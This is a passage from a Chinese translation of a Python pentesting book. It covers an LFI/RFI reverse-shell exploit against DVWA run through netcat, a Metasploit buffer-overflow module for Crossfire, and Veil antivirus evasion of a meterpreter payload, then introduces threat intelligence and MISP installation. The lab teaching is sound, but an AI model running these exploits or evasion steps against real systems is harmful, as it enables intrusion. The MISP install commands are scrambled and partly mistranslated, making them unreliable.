tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2
sudo cp phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/bin/
sudo cp phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/local/bin/
```

安装`phantomjs`后，我们需要在控制台上执行以下命令：**`unset QT_QPA_PLATFORM`**。这是用于处理`phantomjs`在 Ubuntu 16.04 版本上使用时抛出的错误，错误信息如下：`Message: Service phantomjs unexpectedly exited. Status code was: -6`。

# LFI/RFI 漏洞利用代码

让我们看看下面的代码，它将利用 DVWA 中的 LFI/RFI 漏洞：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/fa1254bb-ed18-4d07-a749-72f6d49e6574.png)

在下面的代码片段中，第 65 至 74 行检查要测试的应用程序是否需要身份验证才能利用漏洞：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/58e6d1f1-3be7-489c-b957-61c30bdb0d7b.png)

如果需要身份验证，则从用户提供的 cookie 值设置在 Selenium Python 浏览器/驱动程序中，并使用 cookie 数据调用 URL 以获得有效会话：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/004a5612-24a9-4a1f-b394-e8ebc59fa3e1.png)

第 90 至 105 行用于控制 LFI 漏洞的工作流程。这一部分有一系列我们手动执行的步骤。在第 91 行，我们准备了一个恶意 URL，将毒害日志文件并在`access.log`文件中放置一个 PHP 代码片段。在第 93 行，我们将该恶意 URL 放入一个名为`exp.txt`的文本文件中，并要求 Netcat 从该文件中获取输入。请记住，我们在之前毒害`access.log`文件时使用了`netcat`；这里将重复相同的操作。在第 97 行，我们要求`netcat`连接到受害者服务器的`80`端口，从`exp.txt`文件中获取输入，并将该输入发送到受害者服务器，以便毒害日志。我们通过创建一个 bash 脚本`exp.sh`来实现这一点。在第 99 行，我们调用这个 bash 脚本，它将调用`netcat`并导致`netcat`从`evil.txt`文件中获取输入，从而毒害日志。在第 103 行，我们设置了漏洞利用 URL，我们将让我们模拟的 selenium 浏览器访问，以便给我们一个反向 shell：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/ca58e9a5-7ce5-4b93-b1ad-b94a472b1cf0.png)

在第 115 行，我们正在调用一个进程，该进程将使浏览器使用`start()`方法向一个带有有效载荷的易受攻击页面发出请求，在第 116 行之下。但在实际访问利用之前，我们需要设置一个 netcat 监听器。第 119 行设置了一个 Netcat 监听器，并且我们在`send_exp()`方法的定义中引入了五秒的时间延迟，给 netcat 启动的时间。一旦启动，有效载荷将通过`send_exp()`方法在第 61 行之下传递。如果一切顺利，我们的监听器将获得 shell。

107-113 行处理漏洞的 RFI 部分。要利用 RFI，我们需要在攻击者机器上创建一个名为`evil.txt`的恶意文件，它将传递 PHP 有效载荷。创建后，我们需要将它放在`/var/www/html/evil.txt`中。然后，我们需要启动 Apache 服务器并将有效载荷传递 URL 更新为 RFI 的地址。最后，使用`send_exp()`方法，我们传递我们的有效载荷，然后启动 netcat 监听器。

上述代码适用于 LFI 和 RFI 漏洞。给定的代码按以下顺序获取用户参数：

```py
python LFI_RFI.py <target ip> <target Base/Login URL> <target Vulnetable URL> <Target Vul parameter> <Login required (1/0)> <Login cookies> <Attacker IP> <Attacker Lister PORT> <Add params required (1/0)> <add_param_name1=add_param_value1,add_param_name2=add_param_value2>  | <LFI (0/1)>
```

# 执行 LFI 利用

要执行和利用 LFI 漏洞，我们将向脚本传递以下参数：

```py
python LFI_RFI.py 192.168.1.102 http://192.168.1.102/dvwa/login.php http://192.168.1.102/dvwa/vulnerabilities/fi/ page 1 "security=low;PHPSESSID=5c6uk2gvq4q9ri9pkmprbvt6u2" 192.168.1.102 4444
```

上述命令将产生如下截图所示的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/0a149bad-cf5b-4443-9498-5362a47481b9.png)![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/f55804f0-eee1-4ada-9e80-3ba646eadbe7.png)

如图所示，我们成功获得了`www-data`的低权限 shell。

# 执行 RFI 利用

执行和利用 RFI 漏洞，我们将向脚本传递以下参数：

```py
python LFI_RFI.py 192.168.1.102 http://192.168.1.102/dvwa/login.php http://192.168.1.102/dvwa/vulnerabilities/fi/ page 1 "security=low;PHPSESSID=5c6uk2gvq4q9ri9pkmprbvt6u2" 192.168.1.102 4444 0 0
```

上述命令将产生如下截图所示的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/a18dd40a-9e5c-4566-89b0-4f45e5a734d6.png)

如我们所见，我们成功获得了 RFI 漏洞的 shell。

# 开发一个 Metasploit 模块来利用网络服务

在本节中，我们将看到如何制作一个 Metasploit 利用模块来利用给定的漏洞。在这种情况下，我们将专注于一个名为 Crossfire 的游戏应用程序的缓冲区溢出漏洞。为了编写自定义的 Metasploit 模块，我们需要将它们放在特定的目录中，因为当我们在 Metasploit 中使用`use exploit /....`命令时，默认情况下，框架会在默认的 Metasploit 利用目录中查找可用的模块。如果它在那里找不到给定的利用，那么它会在扩展模块目录中搜索，该目录位于以下路径：`/root/msf4/modules/exploits`。让我们创建路径和一个自定义目录。我们将打开我们的 Kali 虚拟机并运行以下命令：

```py
mkdir -p ~/.msf4/modules/exploits/custom/cf
cd ~/.msf4/modules/exploits/custom/cf
touch custom_cf.rb
```

上述命令将在/root/.msf4/modules/exploits/custom/cf 目录中创建一个名为`custom_cf`的文件。

现在，让我们编辑`custom_cf.rb`文件，并将以下内容放入其中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/672e6ba9-81f8-4603-a9ad-cdb9657f1aa8.png)

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/214be2c9-1973-4f30-bd38-57ddd2c2c4a1.png)

上述提到的代码片段非常简单。它试图利用 Crossfire 应用程序中存在的缓冲区溢出漏洞。Metasploit 为其利用模块定义了一个模板，如果我们要在 Metasploit 中编写模块，我们需要根据我们的需求调整模板。上述模板是用于缓冲区溢出类漏洞的模板。

我们在之前的章节中详细研究了缓冲区溢出。根据我们所学到的，我们可以说要利用缓冲区溢出漏洞，攻击者必须了解以下内容：

+   缓冲区空间可以容纳的有效载荷大小。

+   堆栈的返回地址，必须被注入漏洞利用代码的缓冲区地址所覆盖。实际的返回地址会有所不同，但可以计算出覆盖返回地址的有效负载偏移量。一旦我们有了偏移量，我们就可以放置我们能够注入漏洞利用程序的内存位置的地址。

+   应用程序识别的一组字符，可能会妨碍我们的漏洞利用程序的执行。

+   所需的填充量。

+   架构和操作系统的详细信息。

攻击者为了获得上述项目，会执行一系列步骤，包括模糊测试、偏移计算、返回地址检查、坏字符检查等。如果已知上述值，攻击者的下一步通常是生成编码的有效负载并将其发送到服务端并获得一个反向 shell。如果上述值未知，Metasploit 提供了一个缓冲区溢出模板，可以直接插入并使用这些值，而无需我们从头开始编写自定义代码。

讨论中的应用程序 Crossfire 已经在离线状态下进行了模糊测试和调试。根据模糊测试结果，获得的返回地址或 EIP 的值为`0X0807b918`。换句话说，这意味着如果我们溢出缓冲区，漏洞利用代码将被放置在以下地址的位置：`0X0807b918`。此外，如上所示，指定的填充量为 300（空格）。我们还指定了坏字符：`\x00\x0a\x0d\x20`。除此之外，我们还指定了平台为 Linux。

请注意：坏字符是程序字符集无法识别的字符，因此它可能使程序以意外的方式运行。为了找出正在测试的底层软件的常见坏字符，最成功的方法是反复试验。我通常用来找出常见坏字符的方法是将所有唯一字符发送到应用程序，然后使用调试器，检查寄存器级别发生了哪些字符变化。发生变化的字符可以进行编码和避免。

因此，在第 43 行，当我们调用`payload.invoke`命令时，Metasploit 内部创建一个反向 Meterpreter TCP 有效负载并对其进行编码，返回一个端口为`4444`的 shell。让我们尝试看看这个过程：

1.  首先，让我们安装并启动 Crossfire 应用程序。可以在以下网址找到易受攻击版本的 Crossfire 应用程序[`osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/`](https://osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/)。下载并使用以下命令解压缩：

```py
 tar zxpf crossfire.tar.gz
```

1.  然后，按以下方式启动易受攻击的服务器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/98107c65-0bc0-49dc-ab3e-c966c6264711.png)

现在继续启动 Metasploit。导出我们创建的模块，并尝试利用易受攻击的服务器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/9f271686-e0b4-46fd-b09e-a2f0f2a3b0c2.png)

正如我们所看到的，我们开发的漏洞利用程序完美地运行，并为我们提供了受害者机器的反向 shell，而在我们的情况下，这台机器与我们正在使用的机器相同。

# 对 shell 代码进行编码以避免检测

现在假设我们已经在我们正在测试的底层服务中发现了一个漏洞。然而，在这种情况下，该服务器已安装了杀毒软件。任何优秀的杀毒软件都将包含所有知名漏洞的签名，通常几乎所有 Metasploit 漏洞利用模块的签名都会存在。因此，我们必须使用一种可以规避杀毒软件检测的方法。这意味着我们需要使用某种编码或其他方法来传递我们的有效负载，以避免杀毒软件的检测。我们可以通过三种不同的方式来做到这一点：

1.  最成功的方法是使用您选择的语言（Python/C/C++/Java）开发自定义利用程序。这种方法很有用，因为自定义利用程序不会有任何 AV 签名，通常会逃避 AV 保护。或者，我们也可以下载一个公共利用程序，并进行大量修改以改变其产生的签名。我们在 Web 利用案例中开发的利用程序都是从头开始编写的，理论上不应该被任何 AV 检测到。

1.  第二种方法是将我们的有效载荷/利用程序注入到底层系统的进程内存中。这样做将在内存中执行代码，并且大多数防病毒软件都不会检测到。

1.  第三种方法是利用编码来防止被检测。在本节中，我们将看到如何利用一个非常强大的编码框架 VEIL 来制作一个可能逃避 AV 检测的有效载荷。

# 下载和安装 Veil

应该注意，Veil 已预装在最新版本的 Kali Linux 中。对于其他版本的 Linux，我们可以使用以下命令安装 Veil：

```py
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```

一旦 Veil 成功安装，生成 Veil 编码有效载荷就是一个非常简单的任务。在使用 Veil 时，背后发生的事情是，它试图使利用代码变得神秘和随机，以便基于签名的检测工作的 AV 可能会被利用的随机性和神秘性所愚弄。有两种方法可以做到这一点。一种方法是使用 Veil 提供的交互式 shell。这可以通过输入命令`veil`，然后在规避模块下选择一个有效载荷来调用。另一个更简单的选择是在命令行中指定所有选项，如下所示：

```py
veil -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.102 --port 4444 -o exploit
```

上面的命令将使用 Veil 的有效载荷编号`41`来对 Metasploit 模块`windows/meterpreter/reverse_tcp`进行编码。这将产生以下输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/df1f54a8-9f90-49b6-93f3-619126499a09.png)

上面的截图显示了 Veil 将对其进行编码并可以传递给受害者以查看其是否逃避防病毒软件的利用程序。如果没有，那么我们必须使用 Veil 的交互版本来调整有效载荷参数，以生成更独特的签名。您可以在“进一步阅读”部分的链接中找到有关 Veil 的更多信息。

# 总结

在本章中，我们学习了开发自定义利用程序来利用 Web 和网络服务。我们还讨论了如何从防病毒软件中逃避我们的利用。此外，我们还探讨了各种 Web 漏洞，如 LFI 和 RFI，并讨论了如何提升这些漏洞以从受害者那里获得反向 shell。重要的是要理解，利用开发需要对潜在漏洞的深入理解，我们应该始终尝试制作可重用的通用利用程序。请随意修改我们讨论的利用代码，使其通用化，并尝试在其他应用程序中使用它们。

在下一章中，我们将走出渗透测试生态系统，了解更多关于安全运营中心（SOC）或网络安全监控生态系统的信息。我们将了解什么是网络威胁情报以及如何利用它来保护组织免受潜在威胁。我们还将了解如何将网络威胁情报自动化，以辅助 SIEM 工具的检测能力。

# 问题

1.  还可以使用自定义利用程序利用哪些其他基于 Web 的漏洞？

1.  如果一个攻击向量失败，我们如何改进开发的利用代码以尝试其他可能性？

# 进一步阅读

+   Python 中的利用程序开发：[`samsclass.info/127/127_WWC_2014.shtml`](https://samsclass.info/127/127_WWC_2014.shtml)

+   Python 漏洞开发辅助：[`github.com/longld/peda`](https://github.com/longld/peda)

+   创建 Metasploit 模块：[`github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules`](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules)

+   Veil：[`www.veil-framework.com/veil-tutorial/`](https://www.veil-framework.com/veil-tutorial/)


# 第十四章：网络威胁情报

到目前为止，本书一直关注网络安全的攻击方面。我们主要关注使用 Python 在渗透测试领域。在本章中，我们将尝试理解 Python 如何在网络安全的防御方面使用。当我们谈论网络安全的防御时，首先想到的是监控。**安全运营中心**是一个常用于监控团队的术语，负责持续监控组织的安全格局。这个团队使用一种称为**安全信息与事件管理**（**SIEM**）的工具，它作为一个聚合器，收集需要监控的各种应用程序和设备的日志。除了聚合，SIEM 还有一个规则引擎，其中配置了各种规则用于异常检测。规则因组织而异，取决于业务背景和需要监控的日志。如今，我们经常有许多基于大数据集群构建的 SIEM 解决方案，这些解决方案使用机器学习算法，并由人工智能模型驱动，结合规则引擎，使监控更加有效。那么网络威胁情报在这一切中的作用是什么？我们将在本章中学习这一点，以及以下主题：

+   网络威胁情报

+   工具和 API

+   威胁评分：为每个 IOC 给出一个分数

+   STIX 和 TAXII 以及外部查找

# 网络威胁情报简介

**网络威胁情报**是处理原始收集信息并将其转化为可操作情报的过程。广义上说，威胁情报是一个包括手动情报收集和使用自动化工具来增强组织安全格局的过程。让我们在本节中尝试理解自动化和手动威胁情报。

# 手动威胁情报

手动威胁情报是手动收集情报并将其转化为可操作情报的过程。让我们以一个特定于组织的手动威胁情报为例。

为组织“X”的网络安全团队工作的分析师对组织的内部情况非常了解，包括高层管理、关键流程和关键应用。作为网络安全和情报团队的一员，这名员工的职责之一就是在深网/暗网上搜索可能针对组织的潜在威胁。威胁的范围总是多种多样的。可能包括泄露的电子邮件或在暗网上的痕迹，这可能会引起组织的警惕。另一个威胁可能是针对特定行业（如电信行业）的勒索软件。如果员工发现了这一点，组织就能提前得到警报，并加强对勒索软件的防御机制。

手动威胁情报的另一个例子是收集与内部威胁相关的信息。对于一个拥有庞大员工群体和大量流程的组织来说，监控每个人总是很困难的。安全信息与事件管理系统（SIEM）通常难以监控行为威胁。假设有一个服务器 X（Web 服务器），通常每天与服务器 Y（数据库）和 Z（应用程序）通信。然而，SIEM 的一些痕迹表明服务器 X 正在通过 SMB 端口`445`与服务器 A 通信。这种行为很奇怪和可疑。现在，要对各个服务器之间的日常通信进行基线分析，并创建规则以检测异常对于 SIEM 来说将会非常困难，因为组织内通常有大量系统。虽然现在有一些解决方案是基于人工智能引擎和大数据构建的，用于进行此类异常检测，但手动威胁狩猎目前仍然效果最好。在组织内手动识别异常的这一过程被称为**内部威胁狩猎**。

# 自动化威胁情报

正如我们所讨论的，**威胁情报**是一个先进的过程，使组织能够不断收集基于上下文和情境风险分析的有价值的网络威胁见解。它可以根据组织特定的威胁格局进行定制。简单来说，威胁情报是基于识别、收集和丰富相关网络威胁数据和信息的分析输出。网络威胁数据通常包括威胁迹象（IOCs），如恶意 IP、URL、文件哈希、域名、电子邮件地址等。

这个收集信息并将其转化为可供安全产品（如 SIEM 工具、IDS/IPS 系统、防火墙、代理服务器、WAF 等）使用的可操作情报的过程是我们在本章中将重点关注的。这个收集和情境化信息的过程可以手动完成，如前所述，也可以自动化。自动化可以进一步分为分离的自动化（在脚本级别）或使用中央编排引擎的自动化。我们将考虑两者的优缺点。

有各种安全网站和社区公开分享网络情报数据，作为一种协作措施来对抗黑客活动，并保护组织免受新兴威胁。这些社区通常使用所谓的威胁共享源或威胁源。共享的数据包含恶意 URL、恶意 IP、恶意文件、恶意文件的签名、恶意域名、恶意 C&C 服务器等。所有共享的数据都是由组织报告的，表示已经做了可疑的事情。这可能是 SSH 扫描活动、水平扫描、钓鱼网站、暴力 IP、恶意软件签名等。

收集的所有信息都与 SIEM 共享，并在 SIEM 上创建规则，以检测组织内部针对标记为恶意的 IOCs 的任何通信。如果 SIEM 指示内部服务器或资产与收集的 IOCs 之间存在通信，它将警告组织，然后可以采取适当的预防措施。虽然这个过程可能看起来很简单，但实际上并不像看起来那么简单。行业面临的主要挑战是 IOCs 的质量。值得注意的是，已经收集了数百万个 IOCs。组织拥有的高质量 IOCs 越多，检测就越好。然而，拥有数百万个 IOCs 并不能默认提高检测能力。我们不能只是以自动化的方式收集 IOCs 并将其提供给 SIEM。从不同格式（如 JSON、CSV、STIX、XML、txt 和数据库文件）的各种来源收集的 IOCs 带有大量噪音。这意味着非恶意的域和 IP 也被标记。如果直接将这些嘈杂的数据提供给 SIEM，并在其上创建规则，这将导致大量的误报警报，从而增加分析师所需的工作量。

在本章中，我们将学习如何消除误报警报并提高收集的 IOCs 的质量。我们将编写一个自定义的 Python 算法来提高 IOCs 的质量，并为每个收集的 IOCs 关联一个威胁分数。威胁分数将在 1 到 10 的范围内。较高端的分数表示更严重的潜在严重性，而较低端的分数可能不太严重。这将使我们只与 SIEM 共享高质量的 IOCs，从而提高真正的阳性率。

# 网络威胁情报平台

如前所述，情报收集的过程可以通过不同的脚本自动化，我们可以将它们组合起来，或者建立一个能够收集和分享网络威胁情报的中央平台。具有这种能力的中央平台被称为网络威胁情报平台。让我们试着理解网络威胁情报收集的半自动化和完全自动化过程：

+   以下图表代表了威胁情报平台试图解决的问题陈述。在一个大型组织中，SIEM 工具每分钟生成 100-100,000 个事件，规则引擎每小时触发 20-50 个警报。分析师需要手动验证每个警报，并检查相关的 IP 或域名是否合法。分析师必须使用各种安全查找站点，手动解释它们，并决定警报是否有资格进一步调查，或者是否是误报。这就是大量人力投入的地方，也是我们需要自动化网络威胁情报的地方：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/abff1fea-c6c6-4c3e-8996-5ccaa5d16960.png)

+   情报数据收集的各种来源包括以下内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/3a94c6e2-38e5-4fef-87e0-85472ea33968.png)

+   一个完全成熟的威胁情报平台的能力包括以下内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/00538934-7b26-490c-bf42-af07ecf6437f.png)

# 工具和 API

当我们谈论网络威胁情报平台时，有许多商业和开源工具可用于收集、情境化和分享情报。一些最知名的商业工具包括以下内容：

+   IBM X-Force Exchange

+   Anomali ThreatStream

+   Palo Alto Networks AutoFocus

+   RSA NetWitness 套件

+   LogRhythm 威胁生命周期管理（TLM）平台

+   FireEye iSIGHT Threat Intelligence

+   LookingGlass Cyber Solutions

+   AlienVault 统一安全管理（USM）

最知名的开源工具包括以下内容：

+   MISP

+   OpenIOC

+   OpenTAXII

+   Yeti

+   AbuseHelper

+   sqhunter

+   sqhunter

所有先前提到的开源工具都非常好，并且具有不同的功能。我个人发现**恶意软件信息共享平台**（**MISP**）在功能和特性方面都非常有用。它成为我最喜欢的原因是其可扩展的架构和其 API，使其能够与其他编程语言协作。这是我们将在本章重点关注的开源威胁情报平台。我们的目标是了解 MISP 开箱即用提供了什么，以及我们可以添加哪些附加功能，以获得高质量的 IOC 源文件到 SIEM 工具。MISP 暴露了一个很棒的`pymisp`API，用于从 Python 中消费收集的 IOCs。

# MISP

**MISP**是一个用 cakePHP 编写的框架，有着出色的社区支持。该框架的目标是从发布恶意内容的各种源头收集威胁情报，并将其存储在后端存储库中。相同的内容可以在以后进行分析并与安全工具（如 SIEM、防火墙和 IDS/IPS 系统）共享。该工具有很多功能，包括以下内容：

+   它有一个中央解析器，能够解析各种 IOC 源文件，如纯文本、CSV、TSV、JSON 和 XML。这是一个很大的优势，因为这意味着我们不必担心情报以何种格式从源头提供。不同的源头以不同的格式提供情报。中央解析器解析 IOC 信息，并将其转换为与 MISP 支持的后端模式匹配的一致格式。

+   它有一个 API，使我们能够直接与 SIEM 工具共享情报（但这是一个缺点，因为 MISP 尚未具有误报消除能力）。

+   它具有与其他 MISP 实例集成并具有用于提供威胁共享的服务器的能力。

+   它具有基于角色的访问 Web 界面的功能，允许分析人员了解和关联收集的 IOC。

+   它具有基于队列的后端工作系统，其中可以安排一系列源在任何时间/一天的任何时间进行。我们还可以更改这应该重复多久。后端工作程序和排队系统基于 Redis 和 CakeResque。

+   MISP 不仅在收集威胁信息方面非常出色，而且在相关性和以多种格式共享信息方面也非常出色，例如 CSV、STIX、JSON、文本、XML 和 Bro-IDS 签名。

MISP 提供的完整功能列表可以在官方存储库中找到：[`github.com/MISP/MISP`](https://github.com/MISP/MISP)。

# 安装 MISP

安装说明可以在先前提到的 GitHub 存储库中找到。我们已经在 CentOS 7 上测试了代码并使用了它。执行以下说明在 CentOS 7 上设置 MISP：

```py
# INSTALLATION INSTRUCTIONS
## for CentOS 7.x

### 0/ MISP CentOS 7 Minimal NetInstall - Status
--------------------------------------------
!!! notice
Semi-maintained and tested by @SteveClement, CentOS 7.5-1804 on 20181113<br />
It is still considered experimental as not everything works seemlessly.
CentOS 7.5-1804 [NetInstallURL](http://mirror.centos.org/centos/7.5.1804/os/x86_64/)

{!generic/globalVariables.md!}

```bash

# CentOS 特定

RUN_PHP='/usr/bin/scl enable rh-php71 '

RUN_PYTHON='/usr/bin/scl enable rh-python36 '

PHP_INI=/etc/opt/rh/rh-php71/php.ini

```py
 ### 1/ Minimal CentOS install 
```

1.  使用以下软件安装一个最小的 CentOS 7.x 系统：

```py
- OpenSSH server
- LAMP server (actually, this is done below)
- Mail server
```bash

# 确保将主机名设置为正确的，而不是像一个蛮人（手动在/etc/hostname 中）

使用 sudo hostnamectl set-hostname misp.local #或者您希望它成为什么

# 确保您的系统是最新的：

使用 sudo yum update -y

```py
 ### 2/ Dependencies *
 ----------------
```

1.  安装完成后，您可以以 root 或使用`sudo`执行以下步骤：

```py
```bash

# 我们需要一些来自企业 Linux 额外软件包存储库的软件包

使用 sudo yum install epel-release -y

# 自 MISP 2.4 起，PHP 5.5 是最低要求，因此我们需要比 CentOS 基础提供的更新版本

# 软件集合是一种方法，参见 https://wiki.centos.org/AdditionalResources/Repositories/SCL

使用 sudo yum install centos-release-scl -y

# 安装 vim（可选）

使用 sudo yum install vim -y

# 安装依赖项：

使用 sudo yum install gcc git httpd zip redis mariadb mariadb-server python-devel python-pip python-zmq libxslt-devel zlib-devel ssdeep-devel -y

# 从 SCL 安装 PHP 7.1，参见 https://www.softwarecollections.org/en/scls/rhscl/rh-php71/

使用 sudo yum install rh-php71 rh-php71-php-fpm rh-php71-php-devel rh-php71-php-mysqlnd rh-php71-php-mbstring rh-php71-php-xml rh-php71-php-bcmath rh-php71-php-opcache -y

# 从 SCL 安装 Python 3.6，参见

# https://www.softwarecollections.org/en/scls/rhscl/rh-python36/

使用 sudo yum install rh-python36 -y

# rh-php71-php 仅为来自 SCL 的 httpd24-httpd 提供 mod_ssl mod_php

# 如果我们想要使用 CentOS 基础的 httpd，我们可以使用 rh-php71-php-fpm

使用 sudo systemctl enable rh-php71-php-fpm.service

使用 sudo systemctl start rh-php71-php-fpm.service

使用 sudo $RUN_PHP "pear channel-update pear.php.net"

使用 sudo $RUN_PHP "pear install Crypt_GPG"    #我们需要版本>1.3.0

```py
!!! notice
$RUN_PHP makes php available for you if using rh-php71\. e.g: sudo $RUN_PHP "pear list | grep Crypt_GPG"
```bash

# GPG 需要大量的熵，haveged 提供熵

使用 sudo yum install haveged -y

使用 sudo systemctl enable haveged.service

使用 sudo systemctl start haveged.service

# 启用并启动 redis

使用 sudo systemctl enable redis.service

使用 sudo systemctl start redis.service

```py
### 3/ MISP code
------------
```bash

```py

3.  Download MISP using `git` in the `/var/www/` directory:

```

使用 sudo mkdir $PATH_TO_MISP

使用 sudo chown apache:apache $PATH_TO_MISP

cd /var/www

使用 sudo -u apache git clone https://github.com/MISP/MISP.git

cd $PATH_TO_MISP

使用 sudo -u apache git checkout tags/$(git describe --tags `git rev-list --tags --max-count=1`)

# 如果最后一个快捷方式不起作用，请手动指定最新版本

# 例如：git checkout tags/v2.4.XY。以下是经过测试的：（git checkout tags/v2.4.79）

# 关于“分离的 HEAD 状态”的消息是预期行为

# （如果要更改内容并进行拉取请求，只需创建一个新分支）

# 获取子模块

使用 apache 用户执行 git submodule update --init --recursive

# 使 git 忽略子模块的文件系统权限差异

使用 apache 用户执行 git submodule foreach --recursive git config core.filemode false

# 创建一个 python3 虚拟环境

sudo -u apache $RUN_PYTHON "virtualenv -p python3 $PATH_TO_MISP/venv"

cd /var/www/MISP/app

cd /var/www/MISP/app/files/scripts/python-stix

sudo -u apache $PATH_TO_MISP/venv/bin/pip install -U pip setuptools

# 通过运行以下命令安装 Mitre 的 STIX 及其依赖项：

sudo yum install python-importlib python-lxml python-dateutil python-six -y

cd /var/www/MISP/app/files/scripts

post_max_size = 50M

sudo chown apache:apache /var/www/MISP/app/files/terms

CakeResque 通常使用 phpredis 连接到 redis，但它有一个（有缺陷的）通过 Redisent 的备用连接器。强烈建议使用"yum install php-redis"安装 phpredis

```py

4.  If your `umask` has been changed from the default, it is a good idea to reset it to `0022` before installing the Python modules:

```

UMASK=$(umask)

umask 0022

sudo mkdir /usr/share/httpd/.composer

sudo -u apache $PATH_TO_MISP/venv/bin/pip install .

# 安装 maec

sudo -u apache $PATH_TO_MISP/venv/bin/pip install -U maec

# 安装 zmq

sudo -u apache $PATH_TO_MISP/venv/bin/pip install -U zmq

# 建议：在/etc/opt/rh/rh-php71/php.ini 中更改一些 PHP 设置

sudo -u apache $PATH_TO_MISP/venv/bin/pip install -U redis

# 安装 magic、lief、pydeep

sudo -u apache $PATH_TO_MISP/venv/bin/pip install -U python-magic lief git+https://github.com/kbandla/pydeep.git

# 安装 mixbox 以适应新的 STIX 依赖项：

cd /var/www/MISP/app/files/scripts/

sudo -u apache git clone https://github.com/CybOXProject/mixbox.git

cd /var/www/MISP/app/files/scripts/mixbox

完成

# sudo -u apache $RUN_PHP "php composer.phar install"

cd /var/www/MISP/PyMISP

sudo chmod -R g+ws /var/www/MISP/app/files/scripts/tmp

sudo chown apache:apache /usr/share/httpd/.cache

# 为 php-fpm 启用 python3

安装 PyMISP

sudo sed -i.org -e 's/^;\(clear_env = no\)/\1/' /etc/opt/rh/rh-php71/php-fpm.d/www.conf

sudo systemctl restart rh-php71-php-fpm.service

umask $UMASK

```py
 ### 4/ CakePHP
 -----------
#### CakePHP is now included as a submodule of MISP and has been fetch by a previous step.
```

1.  sudo ln -s ../php-fpm.d/timezone.ini /etc/opt/rh/rh-php71/php.d/99-timezone.ini

```py
```bash

```py
```bash

cd /var/www/MISP/app/files/scripts/python-cybox

sudo chown apache:apache /usr/share/httpd/.composer

echo 'source scl_source enable rh-python36' | sudo tee -a /etc/opt/rh/rh-php71/sysconfig/php-fpm

sudo $RUN_PHP "pecl install redis"

sudo -u apache $RUN_PHP "php composer.phar config vendor-dir Vendor"

sudo -u apache $RUN_PHP "php composer.phar require kamisama/cake-resque:4.1.2"

# sudo -u apache git clone https://github.com/STIXProject/python-stix.git

sudo find /var/www/MISP -type d -exec chmod g=rx {} \;

echo "extension=redis.so" |sudo tee /etc/opt/rh/rh-php71/php-fpm.d/redis.ini

sudo ln -s ../php-fpm.d/redis.ini /etc/opt/rh/rh-php71/php.d/99-redis.ini

sudo systemctl restart rh-php71-php-fpm.service

# 如果您尚未在 php.ini 中设置时区

echo 'date.timezone = "Europe/Luxembourg"' |sudo tee /etc/opt/rh/rh-php71/php-fpm.d/timezone.ini

使用以下命令作为 root 用户确保权限设置正确：

# sudo -u apache git clone https://github.com/CybOXProject/python-cybox.git

# max_execution_time = 300

# memory_limit = 512M

# upload_max_filesize = 50M

# sudo -u apache $PATH_TO_MISP/venv/bin/pip install enum34

sudo -u apache $PATH_TO_MISP/venv/bin/pip install .

对于 upload_max_filesize、post_max_size、max_execution_time、max_input_time 和 memory_limit 等键

sudo sed -i "s/^\($key\).*/\1 = $(eval echo \${$key})/" $PHP_INI

sudo -u apache $PATH_TO_MISP/venv/bin/pip install .

sudo systemctl restart rh-php71-php-fpm.service

```py

6.  To use the scheduler worker for scheduled tasks, perform the following commands:

```

sudo cp -fa /var/www/MISP/INSTALL/setup/config.php /var/www/MISP/app/Plugin/CakeResque/Config/config.php

```py
```

1.  设置权限如下：

如果您打算使用内置的后台作业，请安装 CakeResque 以及其依赖项：

# 确保使用以下命令作为 root 用户正确设置权限：

sudo chown -R root:apache /var/www/MISP

安装 redis

sudo chmod -R g+r,o= /var/www/MISP

sudo chmod -R 750 /var/www/MISP

sudo chmod -R g+ws /var/www/MISP/app/tmp

sudo chmod -R g+ws /var/www/MISP/app/files

sudo chown -R apache:apache /var/www/MISP

sudo chown apache:apache /var/www/MISP/app/files

sudo mkdir /usr/share/httpd/.cache

sudo chown apache:apache /var/www/MISP/app/files/scripts/tmp

sudo chown apache:apache /var/www/MISP/app/Plugin/CakeResque/tmp

sudo chown -R apache:apache /var/www/MISP/app/Config

sudo chown -R apache:apache /var/www/MISP/app/tmp

sudo chown -R apache:apache /var/www/MISP/app/webroot/img/orgs

sudo chown -R apache:apache /var/www/MISP/app/webroot/img/custom

```py 
```

1.  按如下方式创建数据库和用户：

```py
```bash

# 启用，启动和保护您的 mysql 数据库服务器

sudo systemctl enable mariadb.service

sudo systemctl start mariadb.service

sudo yum install expect -y

# 如果需要，添加您的凭据，如果 sudo 有 NOPASS，请注释掉相关行

#pw="Password1234"

期望 -f - <<-EOF

设置超时时间为 10

生成 sudo mysql_secure_installation

#期望"*?assword*"

#发送 -- "$pw\r"

